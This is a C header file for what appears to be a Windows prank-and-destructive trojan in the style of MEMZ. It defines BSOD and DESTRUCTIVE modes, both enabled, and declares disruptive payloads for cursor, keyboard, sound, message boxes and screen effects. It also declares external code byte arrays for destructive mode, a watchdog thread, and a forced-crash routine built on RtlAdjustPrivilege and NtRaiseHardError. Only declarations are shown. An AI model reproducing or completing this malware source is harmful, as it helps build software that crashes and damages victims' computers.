/* Mode's:
BSOD OFF, DESTRUCTIVE OFF
BSOD ON,  DESTRUCTIVE OFF
BSOD ON,  DESTRUCTIVE ON
*/
#define BSOD
#define DESTRUCTIVE

// Application Headers
#include <Windows.h>
#include <TlHelp32.h>
#include <Shlwapi.h>
#include <Psapi.h>

// Application Libarys
#pragma comment(lib, "winmm.lib")
#ifdef BSOD
#pragma comment(lib, "ntdll.lib")
#endif

// Internal Structur Payload
typedef struct {
	int(*PayloadFunction)(int, int);
	int Delay;
}PAYLOAD;

#define PAYLOADFUNC int Times, int Runtime

extern PAYLOAD Payloads[];
extern const size_t nPayloads;

// Internal Structur Data
#ifdef DESTRUCTIVE
extern const unsigned char Code1[];
extern const unsigned char Code2[];
extern const size_t Code1Len;
extern const size_t Code2Len;
#endif  

extern const wchar_t Note[];
extern const size_t NoteLen;

extern const wchar_t *Sites[];
extern const size_t nSites;

extern const wchar_t *Sounds[];
extern const size_t nSounds;

extern const wchar_t *Msgs[];
extern const size_t nMsgs;

extern int  argc, scrw, scrh;

// NT Functions for KillWindowsInstant
#ifdef BSOD
EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN OldValue);
EXTERN_C NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);
#endif

// Internal Functions
/// Payloads
DWORD WINAPI PayloadThread(LPVOID lpParameter);
int PayloadExecute(PAYLOADFUNC);
int PayloadCursor(PAYLOADFUNC);
int PayloadKeyboard(PAYLOADFUNC);
int PayloadSound(PAYLOADFUNC);
int PayloadBlink(PAYLOADFUNC);
int PayloadMessageBox(PAYLOADFUNC);
int PayloadDrawErrors(PAYLOADFUNC);
int PayloadChangeText(PAYLOADFUNC);
int PayloadPIP(PAYLOADFUNC);
int PayloadPuzzle(PAYLOADFUNC);

/// Utils
int Random();
LRESULT CALLBACK MsgBoxHook(int nCode, WPARAM wParam, LPARAM lParam);
DWORD WINAPI MessageBoxThread(LPVOID lpParameter);
DWORD WINAPI RipMessageThread(LPVOID lpParameter);
void StrReverse(LPWSTR str);
BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam);
void KillWindows();
#ifdef BSOD
void KillWindowsInstant();
#endif

/// WatchDog
DWORD WINAPI WatchDogThread(LPVOID lpParameter);
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);